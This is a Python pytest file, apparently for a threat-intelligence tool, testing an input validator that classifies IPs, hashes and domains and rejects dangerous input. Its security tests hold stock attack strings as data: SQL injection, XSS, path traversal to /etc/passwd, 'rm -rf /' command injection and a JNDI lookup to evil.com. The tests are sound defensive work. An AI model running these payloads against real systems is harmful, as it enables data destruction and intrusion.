"""
Testes unitários para Threat Intelligence Tool.

Execute com: pytest tests/test_validators.py -v
"""

import pytest
from validators import (
    InputValidator,
    ValidationError,
    ValidatedTarget,
    validate_target,
    identify_type
)


class TestInputValidator:
    """Testes para a classe InputValidator."""
    
    # ========== Testes de IPs ==========
    
    def test_validate_ipv4_valid(self):
        """Testa validação de IPv4 válido."""
        result = InputValidator.validate("192.168.1.1")
        assert result.target_type == "ip"
        assert result.sanitized == "192.168.1.1"
    
    def test_validate_ipv4_with_spaces(self):
        """Testa validação de IPv4 com espaços."""
        result = InputValidator.validate("  8.8.8.8  ")
        assert result.target_type == "ip"
        assert result.sanitized == "8.8.8.8"
    
    def test_validate_ipv6_valid(self):
        """Testa validação de IPv6 válido."""
        result = InputValidator.validate("2001:0db8:85a3::8a2e:0370:7334")
        assert result.target_type == "ip"
    
    def test_validate_ipv6_compressed(self):
        """Testa validação de IPv6 comprimido."""
        result = InputValidator.validate("::1")
        assert result.target_type == "ip"
        assert result.sanitized == "::1"
    
    def test_invalid_ip(self):
        """Testa rejeição de IP inválido."""
        with pytest.raises(ValidationError):
            InputValidator.validate("999.999.999.999")
    
    # ========== Testes de Hashes ==========
    
    def test_validate_md5_hash(self):
        """Testa validação de hash MD5."""
        md5 = "5d41402abc4b2a76b9719d911017c592"
        result = InputValidator.validate(md5)
        assert result.target_type == "hash"
        assert result.sanitized == md5.lower()
    
    def test_validate_sha1_hash(self):
        """Testa validação de hash SHA1."""
        sha1 = "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"
        result = InputValidator.validate(sha1)
        assert result.target_type == "hash"
        assert result.sanitized == sha1.lower()
    
    def test_validate_sha256_hash(self):
        """Testa validação de hash SHA256."""
        sha256 = "2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
        result = InputValidator.validate(sha256)
        assert result.target_type == "hash"
        assert result.sanitized == sha256.lower()
    
    def test_validate_hash_uppercase(self):
        """Testa que hashes são convertidos para minúsculo."""
        result = InputValidator.validate("5D41402ABC4B2A76B9719D911017C592")
        assert result.sanitized == "5d41402abc4b2a76b9719d911017c592"
    
    def test_invalid_hash_length(self):
        """Testa rejeição de hash com tamanho inválido."""
        with pytest.raises(ValidationError):
            InputValidator.validate("abc123")  # Muito curto
    
    def test_invalid_hash_characters(self):
        """Testa rejeição de hash com caracteres inválidos."""
        with pytest.raises(ValidationError):
            InputValidator.validate("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")  # 32 chars mas inválido
    
    # ========== Testes de Domínios ==========
    
    def test_validate_domain_valid(self):
        """Testa validação de domínio válido."""
        result = InputValidator.validate("example.com")
        assert result.target_type == "domain"
        assert result.sanitized == "example.com"
    
    def test_validate_subdomain(self):
        """Testa validação de subdomínio."""
        result = InputValidator.validate("www.example.com")
        assert result.target_type == "domain"
    
    def test_validate_domain_uppercase(self):
        """Testa que domínios são convertidos para minúsculo."""
        result = InputValidator.validate("EXAMPLE.COM")
        assert result.sanitized == "example.com"
    
    def test_validate_domain_with_hyphen(self):
        """Testa domínio com hífen."""
        result = InputValidator.validate("my-domain.com")
        assert result.target_type == "domain"
    
    def test_invalid_domain_starts_with_hyphen(self):
        """Testa rejeição de domínio começando com hífen."""
        with pytest.raises(ValidationError):
            InputValidator.validate("-invalid.com")
    
    def test_invalid_domain_ends_with_hyphen(self):
        """Testa rejeição de domínio terminando com hífen."""
        with pytest.raises(ValidationError):
            InputValidator.validate("invalid-.com")
    
    def test_invalid_domain_too_long(self):
        """Testa rejeição de domínio muito longo."""
        long_domain = "a" * 250 + ".com"
        with pytest.raises(ValidationError):
            InputValidator.validate(long_domain)
    
    def test_invalid_domain_label_too_long(self):
        """Testa rejeição de label muito longo."""
        long_label = "a" * 64 + ".com"
        with pytest.raises(ValidationError):
            InputValidator.validate(long_label)
    
    # ========== Testes de Validação Geral ==========
    
    def test_empty_string(self):
        """Testa rejeição de string vazia."""
        with pytest.raises(ValidationError):
            InputValidator.validate("")
    
    def test_none_value(self):
        """Testa rejeição de None."""
        with pytest.raises(ValidationError):
            InputValidator.validate(None)
    
    def test_too_short(self):
        """Testa rejeição de input muito curto."""
        with pytest.raises(ValidationError):
            InputValidator.validate("ab")
    
    def test_too_long(self):
        """Testa rejeição de input muito longo."""
        with pytest.raises(ValidationError):
            InputValidator.validate("a" * 300)
    
    def test_special_characters(self):
        """Testa rejeição de caracteres especiais perigosos."""
        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for dangerous in dangerous_inputs:
            with pytest.raises(ValidationError):
                InputValidator.validate(dangerous)
    
    # ========== Testes de ValidatedTarget ==========
    
    def test_validated_target_str(self):
        """Testa representação string de ValidatedTarget."""
        result = InputValidator.validate("8.8.8.8")
        assert str(result) == "8.8.8.8 (ip)"
    
    def test_validated_target_original_preserved(self):
        """Testa que original é preservado."""
        result = InputValidator.validate("  EXAMPLE.COM  ")
        assert result.original == "  EXAMPLE.COM  "
        assert result.sanitized == "example.com"


class TestConvenienceFunctions:
    """Testes para funções de conveniência."""
    
    def test_validate_target(self):
        """Testa função validate_target."""
        result = validate_target("8.8.8.8")
        assert isinstance(result, ValidatedTarget)
        assert result.target_type == "ip"
    
    def test_identify_type_ip(self):
        """Testa identify_type para IP."""
        assert identify_type("8.8.8.8") == "ip"
    
    def test_identify_type_domain(self):
        """Testa identify_type para domínio."""
        assert identify_type("example.com") == "domain"
    
    def test_identify_type_hash(self):
        """Testa identify_type para hash."""
        assert identify_type("5d41402abc4b2a76b9719d911017c592") == "hash"
    
    def test_identify_type_unknown(self):
        """Testa identify_type para input inválido."""
        assert identify_type("invalid!!!") == "unknown"


# ========== Fixtures ==========

@pytest.fixture
def valid_ipv4():
    """Fixture de IPv4 válido."""
    return "192.168.1.1"


@pytest.fixture
def valid_domain():
    """Fixture de domínio válido."""
    return "example.com"


@pytest.fixture
def valid_md5():
    """Fixture de MD5 válido."""
    return "5d41402abc4b2a76b9719d911017c592"


# ========== Testes Parametrizados ==========

@pytest.mark.parametrize("ip,expected_type", [
    ("8.8.8.8", "ip"),
    ("192.168.1.1", "ip"),
    ("10.0.0.1", "ip"),
    ("::1", "ip"),
    ("2001:db8::1", "ip"),
])
def test_validate_multiple_ips(ip, expected_type):
    """Testa validação de múltiplos IPs."""
    result = InputValidator.validate(ip)
    assert result.target_type == expected_type


@pytest.mark.parametrize("domain", [
    "example.com",
    "www.example.com",
    "subdomain.example.co.uk",
    "my-domain.com",
    "test123.example.com",
])
def test_validate_multiple_domains(domain):
    """Testa validação de múltiplos domínios."""
    result = InputValidator.validate(domain)
    assert result.target_type == "domain"


@pytest.mark.parametrize("hash_value,expected_type", [
    ("5d41402abc4b2a76b9719d911017c592", "hash"),  # MD5
    ("aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d", "hash"),  # SHA1
    ("2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae", "hash"),  # SHA256
])
def test_validate_multiple_hashes(hash_value, expected_type):
    """Testa validação de múltiplos hashes."""
    result = InputValidator.validate(hash_value)
    assert result.target_type == expected_type


# ========== Testes de Performance ==========

@pytest.mark.benchmark
def test_validation_performance(benchmark):
    """Testa performance da validação."""
    result = benchmark(InputValidator.validate, "example.com")
    assert result.target_type == "domain"


# ========== Testes de Segurança ==========

class TestSecurityValidation:
    """Testes de segurança."""
    
    def test_sql_injection_attempt(self):
        """Testa proteção contra SQL injection."""
        malicious = "'; DROP TABLE users; --"
        with pytest.raises(ValidationError):
            InputValidator.validate(malicious)
    
    def test_path_traversal_attempt(self):
        """Testa proteção contra path traversal."""
        malicious = "../../../etc/passwd"
        with pytest.raises(ValidationError):
            InputValidator.validate(malicious)
    
    def test_xss_attempt(self):
        """Testa proteção contra XSS."""
        malicious = "<script>alert('xss')</script>"
        with pytest.raises(ValidationError):
            InputValidator.validate(malicious)
    
    def test_command_injection_attempt(self):
        """Testa proteção contra command injection."""
        malicious = "; rm -rf /"
        with pytest.raises(ValidationError):
            InputValidator.validate(malicious)
    
    def test_ldap_injection_attempt(self):
        """Testa proteção contra LDAP injection."""
        malicious = "${jndi:ldap://evil.com/a}"
        with pytest.raises(ValidationError):
            InputValidator.validate(malicious)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--cov=validators", "--cov-report=html"])
